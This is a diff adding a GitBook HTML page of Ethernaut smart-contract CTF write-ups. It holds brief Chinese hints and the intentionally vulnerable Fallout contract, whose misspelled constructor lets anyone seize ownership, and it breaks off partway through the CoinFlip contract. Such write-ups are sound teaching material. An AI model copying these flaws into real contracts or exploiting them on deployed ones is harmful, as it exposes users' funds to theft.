@@ -1,0 +1,2175 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Ethernaut · Eki's CTF</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Eki">
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-katex/katex.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-multipart/multipart.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-advanced-emoji/emoji-website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-pageview-count/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-auto-scroll-table/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../vulnhub/" />
+    
+    
+    <link rel="prev" href="../pwnable.kr/toddlers-bottle.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://ieki.xyz" target="_blank" class="custom-link">主站 Eki's Blog</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    About
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../library/">
+            
+                <a href="../library/">
+            
+                    
+                    Library
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../library/steganography.html">
+            
+                <a href="../library/steganography.html">
+            
+                    
+                    Steganography
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../library/gdb-tutorial.html">
+            
+                <a href="../library/gdb-tutorial.html">
+            
+                    
+                    GDB Tutorial
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../library/sqli.html">
+            
+                <a href="../library/sqli.html">
+            
+                    
+                    SQL Inject
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../library/php/function.html">
+            
+                <a href="../library/php/function.html">
+            
+                    
+                    Functions
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="../library/php/protocol.html">
+            
+                <a href="../library/php/protocol.html">
+            
+                    
+                    Protocol
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.3" data-path="../library/php/ace.html">
+            
+                <a href="../library/php/ace.html">
+            
+                    
+                    ACE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.4" data-path="../library/php/serialize.html">
+            
+                <a href="../library/php/serialize.html">
+            
+                    
+                    Serialize
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.5" data-path="../library/php/misc.html">
+            
+                <a href="../library/php/misc.html">
+            
+                    
+                    Misc
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../library/htaccess.html">
+            
+                <a href="../library/htaccess.html">
+            
+                    
+                    Apache .htaccess
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../library/ssti.html">
+            
+                <a href="../library/ssti.html">
+            
+                    
+                    SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../library/ssrf.html">
+            
+                <a href="../library/ssrf.html">
+            
+                    
+                    SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../library/xxe.html">
+            
+                <a href="../library/xxe.html">
+            
+                    
+                    XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" data-path="../library/xss.html">
+            
+                <a href="../library/xss.html">
+            
+                    
+                    XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" data-path="../library/shell.html">
+            
+                <a href="../library/shell.html">
+            
+                    
+                    Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" data-path="../library/crypto.html">
+            
+                <a href="../library/crypto.html">
+            
+                    
+                    Crypto
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.12" data-path="../library/js.html">
+            
+                <a href="../library/js.html">
+            
+                    
+                    JavaScript
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.13" data-path="../library/python.html">
+            
+                <a href="../library/python.html">
+            
+                    
+                    Python
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.14" data-path="../library/bash.html">
+            
+                <a href="../library/bash.html">
+            
+                    
+                    BASH
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.15" data-path="../library/forensics.html">
+            
+                <a href="../library/forensics.html">
+            
+                    
+                    Forensics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.16" data-path="../library/pentest.html">
+            
+                <a href="../library/pentest.html">
+            
+                    
+                    Pentest
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.17" data-path="../library/protocol.html">
+            
+                <a href="../library/protocol.html">
+            
+                    
+                    Protocol
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.18" data-path="../library/misc.html">
+            
+                <a href="../library/misc.html">
+            
+                    
+                    MISC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.19" data-path="../library/awd.html">
+            
+                <a href="../library/awd.html">
+            
+                    
+                    AWD
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../contest/">
+            
+                <a href="../contest/">
+            
+                    
+                    Contest
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../contest/hfctf-2021.html">
+            
+                <a href="../contest/hfctf-2021.html">
+            
+                    
+                    2021数字中国创新大赛虎符网络安全赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../contest/hackergame-2019.html">
+            
+                <a href="../contest/hackergame-2019.html">
+            
+                    
+                    Hackergame 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../contest/tsctf-j2019.html">
+            
+                <a href="../contest/tsctf-j2019.html">
+            
+                    
+                    TSCTF-J 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../contest/nctf2019.html">
+            
+                <a href="../contest/nctf2019.html">
+            
+                    
+                    NCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../contest/isoon-2019.html">
+            
+                <a href="../contest/isoon-2019.html">
+            
+                    
+                    ISOON 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6" data-path="../contest/mrctf-2020.html">
+            
+                <a href="../contest/mrctf-2020.html">
+            
+                    
+                    MRCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.7" data-path="../contest/hfctf-2020.html">
+            
+                <a href="../contest/hfctf-2020.html">
+            
+                    
+                    2020数字中国创新大赛虎符网络安全赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.8" data-path="../contest/npuctf-2020.html">
+            
+                <a href="../contest/npuctf-2020.html">
+            
+                    
+                    NPUCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.9" data-path="../contest/gkctf-2020.html">
+            
+                <a href="../contest/gkctf-2020.html">
+            
+                    
+                    GKCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.10" data-path="../contest/sctf-2020.html">
+            
+                <a href="../contest/sctf-2020.html">
+            
+                    
+                    SCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../adworld/">
+            
+                <a href="../adworld/">
+            
+                    
+                    ADworld
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../adworld/misc-exercise-area.html">
+            
+                <a href="../adworld/misc-exercise-area.html">
+            
+                    
+                    Misc Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../adworld/crypto-execrise-area.html">
+            
+                <a href="../adworld/crypto-execrise-area.html">
+            
+                    
+                    Crypto Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../adworld/web-execrise-area.html">
+            
+                <a href="../adworld/web-execrise-area.html">
+            
+                    
+                    Web Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../adworld/pwn-exercise-area.html">
+            
+                <a href="../adworld/pwn-exercise-area.html">
+            
+                    
+                    PWN Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="../adworld/reverse-execrise-area.html">
+            
+                <a href="../adworld/reverse-execrise-area.html">
+            
+                    
+                    Reverse Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" data-path="../adworld/easy_tornado.html">
+            
+                <a href="../adworld/easy_tornado.html">
+            
+                    
+                    Easy Tornado
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.7" data-path="../adworld/i-got-id-200.html">
+            
+                <a href="../adworld/i-got-id-200.html">
+            
+                    
+                    i-got-id-200
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.8" data-path="../adworld/ics-02.html">
+            
+                <a href="../adworld/ics-02.html">
+            
+                    
+                    ics-02
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.9" data-path="../adworld/ics-07.html">
+            
+                <a href="../adworld/ics-07.html">
+            
+                    
+                    ics-07
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.10" data-path="../adworld/shrine.html">
+            
+                <a href="../adworld/shrine.html">
+            
+                    
+                    shrine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.11" data-path="../adworld/super_sqli.html">
+            
+                <a href="../adworld/super_sqli.html">
+            
+                    
+                    super_sqli
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.12" data-path="../adworld/web_php_unserialize.html">
+            
+                <a href="../adworld/web_php_unserialize.html">
+            
+                    
+                    Web_php_unserialize
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.13" data-path="../adworld/web_php_wrong_nginx_config.html">
+            
+                <a href="../adworld/web_php_wrong_nginx_config.html">
+            
+                    
+                    web_php_wrong_nginx_config
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.14" data-path="../adworld/web_python_template_injection.html">
+            
+                <a href="../adworld/web_python_template_injection.html">
+            
+                    
+                    Web_python_template_injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.15" data-path="../adworld/wtf.sh-150.html">
+            
+                <a href="../adworld/wtf.sh-150.html">
+            
+                    
+                    wtf.sh-150
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.16" data-path="../adworld/zhuanxv.html">
+            
+                <a href="../adworld/zhuanxv.html">
+            
+                    
+                    Zhuanxv
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../buuoj/">
+            
+                <a href="../buuoj/">
+            
+                    
+                    BUUOJ
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../buuoj/suctf-2019.html">
+            
+                <a href="../buuoj/suctf-2019.html">
+            
+                    
+                    SUCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../buuoj/ciscn-northeast-2019.html">
+            
+                <a href="../buuoj/ciscn-northeast-2019.html">
+            
+                    
+                    CISCN 2019 华北赛区
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../buuoj/ciscn-pre-2019.html">
+            
+                <a href="../buuoj/ciscn-pre-2019.html">
+            
+                    
+                    CISCN 2019 初赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../buuoj/ciscn-final-2019.html">
+            
+                <a href="../buuoj/ciscn-final-2019.html">
+            
+                    
+                    CISCN 2019 Final
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../buuoj/de1ctf-2019.html">
+            
+                <a href="../buuoj/de1ctf-2019.html">
+            
+                    
+                    De1CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../buuoj/wangdingcup-2018.html">
+            
+                <a href="../buuoj/wangdingcup-2018.html">
+            
+                    
+                    网鼎杯 2018
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="../buuoj/wangdingcup-2019.html">
+            
+                <a href="../buuoj/wangdingcup-2019.html">
+            
+                    
+                    网鼎杯 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.8" data-path="../buuoj/roarctf-2019.html">
+            
+                <a href="../buuoj/roarctf-2019.html">
+            
+                    
+                    RoarCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.9" data-path="../buuoj/0ctf-2016.html">
+            
+                <a href="../buuoj/0ctf-2016.html">
+            
+                    
+                    0CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.10" data-path="../buuoj/gxyctf-2019.html">
+            
+                <a href="../buuoj/gxyctf-2019.html">
+            
+                    
+                    GXYCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.11" data-path="../buuoj/hitcon-2017.html">
+            
+                <a href="../buuoj/hitcon-2017.html">
+            
+                    
+                    Hitcon 2017
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.12" data-path="../buuoj/jikedatiaozhan-2019.html">
+            
+                <a href="../buuoj/jikedatiaozhan-2019.html">
+            
+                    
+                    极客大挑战2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.13" data-path="../buuoj/lctf-2018.html">
+            
+                <a href="../buuoj/lctf-2018.html">
+            
+                    
+                    LCTF 2018
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.14" data-path="../buuoj/de1ctf-2019.html">
+            
+                <a href="../buuoj/de1ctf-2019.html">
+            
+                    
+                    De1CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.15" data-path="../buuoj/swpu-2019.html">
+            
+                <a href="../buuoj/swpu-2019.html">
+            
+                    
+                    SWPU 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.16" data-path="../buuoj/suctf-2019.html">
+            
+                <a href="../buuoj/suctf-2019.html">
+            
+                    
+                    SUCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.17" data-path="../buuoj/bjdctf-2020.html">
+            
+                <a href="../buuoj/bjdctf-2020.html">
+            
+                    
+                    BJDCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.18" data-path="../buuoj/rctf-2015.html">
+            
+                <a href="../buuoj/rctf-2015.html">
+            
+                    
+                    RCTF 2015
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.19" data-path="../buuoj/bytectf-2019.html">
+            
+                <a href="../buuoj/bytectf-2019.html">
+            
+                    
+                    ByteCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.20" data-path="../buuoj/qiangwangbei-2019.html">
+            
+                <a href="../buuoj/qiangwangbei-2019.html">
+            
+                    
+                    强网杯 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.21" data-path="../buuoj/ddctf-2019.html">
+            
+                <a href="../buuoj/ddctf-2019.html">
+            
+                    
+                    DDCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.22" data-path="../buuoj/eis-2019.html">
+            
+                <a href="../buuoj/eis-2019.html">
+            
+                    
+                    EIS 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.23" data-path="../buuoj/vn-2020.html">
+            
+                <a href="../buuoj/vn-2020.html">
+            
+                    
+                    V&N 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.24" data-path="../buuoj/fbctf-2019.html">
+            
+                <a href="../buuoj/fbctf-2019.html">
+            
+                    
+                    FBCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.25" data-path="../buuoj/gyctf-2020.html">
+            
+                <a href="../buuoj/gyctf-2020.html">
+            
+                    
+                    GYCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.26" data-path="../buuoj/bjd-2nd.html">
+            
+                <a href="../buuoj/bjd-2nd.html">
+            
+                    
+                    BJDCTF 2nd
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.27" data-path="../buuoj/fireshellctf-2020.html">
+            
+                <a href="../buuoj/fireshellctf-2020.html">
+            
+                    
+                    FireShellCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.28" data-path="../buuoj/gyctf-2020.html">
+            
+                <a href="../buuoj/gyctf-2020.html">
+            
+                    
+                    GWCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.29" data-path="../buuoj/watevrctf-2019.html">
+            
+                <a href="../buuoj/watevrctf-2019.html">
+            
+                    
+                    WatervrCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.30" data-path="../buuoj/ciscn-southeast-2019.html">
+            
+                <a href="../buuoj/ciscn-southeast-2019.html">
+            
+                    
+                    CISCN2019 华东南赛区
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.31" data-path="../buuoj/bsidescf-2019.html">
+            
+                <a href="../buuoj/bsidescf-2019.html">
+            
+                    
+                    BsidesCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.32" data-path="../buuoj/rctf-2019.html">
+            
+                <a href="../buuoj/rctf-2019.html">
+            
+                    
+                    RCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../pwnable.kr/">
+            
+                <a href="../pwnable.kr/">
+            
+                    
+                    pwnable.kr
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../pwnable.kr/toddlers-bottle.html">
+            
+                <a href="../pwnable.kr/toddlers-bottle.html">
+            
+                    
+                    Toddler's Bottle
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.7" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Ethernaut
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="../vulnhub/">
+            
+                <a href="../vulnhub/">
+            
+                    
+                    Vulnhub
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="../vulnhub/dc-9.html">
+            
+                <a href="../vulnhub/dc-9.html">
+            
+                    
+                    DC-9
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../vulnhub/five86-1.html">
+            
+                <a href="../vulnhub/five86-1.html">
+            
+                    
+                    five86-1
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="../vulnhub/wakanda.html">
+            
+                <a href="../vulnhub/wakanda.html">
+            
+                    
+                    wakanda
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >Ethernaut</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div class="search-plus" id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#ethernaut-write-up"><b></b>Ethernaut Write Up</a></li><ul><li><span class="title-icon "></span><a href="#hello-ethernaut"><b></b>HELLO ETHERNAUT</a></li><li><span class="title-icon "></span><a href="#fallback"><b></b>FALLBACK</a></li><li><span class="title-icon "></span><a href="#fallout"><b></b>FALLOUT</a></li><li><span class="title-icon "></span><a href="#coin-flip"><b></b>COIN FLIP</a></li><li><span class="title-icon "></span><a href="#telephone"><b></b>Telephone</a></li><li><span class="title-icon "></span><a href="#delegation"><b></b>Delegation</a></li><li><span class="title-icon "></span><a href="#force"><b></b>Force</a></li><li><span class="title-icon "></span><a href="#vault"><b></b>Vault</a></li><li><span class="title-icon "></span><a href="#king"><b></b>King</a></li><li><span class="title-icon "></span><a href="#re-entrancy"><b></b>Re-entrancy</a></li><li><span class="title-icon "></span><a href="#elevator"><b></b>Elevator</a></li><li><span class="title-icon "></span><a href="#privacy"><b></b>Privacy</a></li><li><span class="title-icon "></span><a href="#gatekeepertwo"><b></b>GateKeeperTwo</a></li><li><span class="title-icon "></span><a href="#naught-coin"><b></b>Naught Coin</a></li><li><span class="title-icon "></span><a href="#magic-number"><b></b>Magic Number</a></li></ul></ul></div><a href="#ethernaut-write-up" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="ethernaut-write-up"><a name="ethernaut-write-up" class="anchor-navigation-ex-anchor" href="#ethernaut-write-up"><i class="fa fa-link" aria-hidden="true"></i></a>Ethernaut Write Up</h1>
+<h2 id="hello-ethernaut"><a name="hello-ethernaut" class="anchor-navigation-ex-anchor" href="#hello-ethernaut"><i class="fa fa-link" aria-hidden="true"></i></a>HELLO ETHERNAUT</h2>
+<p>&#x57FA;&#x672C;&#x7684;&#x4EA4;&#x4E92;&#x64CD;&#x4F5C;</p>
+<p>&#x6253;&#x5F00;F12&#x8DDF;&#x7740;&#x6307;&#x5F15;&#x5C31;&#x884C;</p>
+<h2 id="fallback"><a name="fallback" class="anchor-navigation-ex-anchor" href="#fallback"><i class="fa fa-link" aria-hidden="true"></i></a>FALLBACK</h2>
+<p>&#x5927;&#x6982;&#x5C31;&#x662F;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x5C31;&#x53EF;&#x4EE5;&#x8C03;&#x7528;&#x51FD;&#x6570;&#x6210;&#x4E3A;owner&#xFF0C;&#x6240;&#x4EE5;&#x6253;&#x70B9;&#x94B1;&#x5C31;&#x597D;&#x4E86;</p>
+<h2 id="fallout"><a name="fallout" class="anchor-navigation-ex-anchor" href="#fallout"><i class="fa fa-link" aria-hidden="true"></i></a>FALLOUT</h2>
+<p>Constructor &#x5199;&#x9519;&#x4E86;</p>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.18</span>;
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&apos;zeppelin-solidity/contracts/ownership/Ownable.sol&apos;</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&apos;openzeppelin-solidity/contracts/math/SafeMath.sol&apos;</span>;
+
+contract Fallout is Ownable {
+
+  using SafeMath <span class="hljs-keyword">for</span> uint256;
+  mapping (address =&gt; uint) allocations;
+
+  <span class="hljs-comment">/* constructor */</span>
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Fal1out</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{<span class="hljs-comment">//&#x8FD9;&#x91CC;&#x662F;l1 &#x4E0D;&#x662F;ll &#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x6210;&#x4E3A;owner</span>
+    owner = msg.sender;
+    allocations[owner] = msg.value;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">allocate</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
+    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendAllocation</span>(<span class="hljs-params">address allocator</span>) <span class="hljs-title">public</span> </span>{
+    <span class="hljs-built_in">require</span>(allocations[allocator] &gt; <span class="hljs-number">0</span>);
+    allocator.transfer(allocations[allocator]);
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">collectAllocations</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">onlyOwner</span> </span>{
+    msg.sender.transfer(<span class="hljs-keyword">this</span>.balance);
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">allocatorBalance</span>(<span class="hljs-params">address allocator</span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint</span>) </span>{
+    <span class="hljs-keyword">return</span> allocations[allocator];
+  }
+}
+</code></pre>
+<h2 id="coin-flip"><a name="coin-flip" class="anchor-navigation-ex-anchor" href="#coin-flip"><i class="fa fa-link" aria-hidden="true"></i></a>COIN FLIP</h2>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.18</span>;
+
+contract CoinFlip {
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = <span class="hljs-number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CoinFlip</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+    consecutiveWins = <span class="hljs-number">0</span>;
+  }
+
